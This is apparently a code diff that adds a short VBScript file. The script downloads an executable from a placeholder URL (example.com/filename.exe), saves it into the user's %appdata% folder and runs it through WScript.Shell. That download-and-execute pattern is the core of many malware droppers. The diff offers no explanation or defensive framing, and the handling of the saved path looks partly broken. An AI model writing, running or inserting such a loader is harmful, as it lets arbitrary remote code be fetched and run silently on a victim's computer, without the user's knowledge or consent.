@@ -1,0 +1,29 @@
+' variables
+Dim xHttp, oStream, oShell, sRemoteURI, sLocalFile
+
+' constants
+Const klBinary = 1
+Const klOverwrite = 2
+
+' defined values
+sRemoteURI = "https://example.com/filename.exe"
+sLocalFile = """%appdata%\filename.exe"""
+
+' create the web request
+Set xHttp = CreateObject("Microsoft.XMLHTTP")
+xHttp.Open "GET", sRemoteURI, False
+xHttp.Send
+
+' save the file locally
+Set oStream = CreateObject("Adodb.Stream")
+oStream.Type = klBinary
+oStream.Open
+oStream.Write xHttp.responseBody
+oStream.SaveToFile sLocalFile, klOverwrite
+Set oStream = Nothing
+Set xHttp = Nothing
+
+' run the file
+Set oShell = WScript.CreateObject("WScript.Shell")
+oShell.Run(sLocalFile)
+Set oShell = Nothing
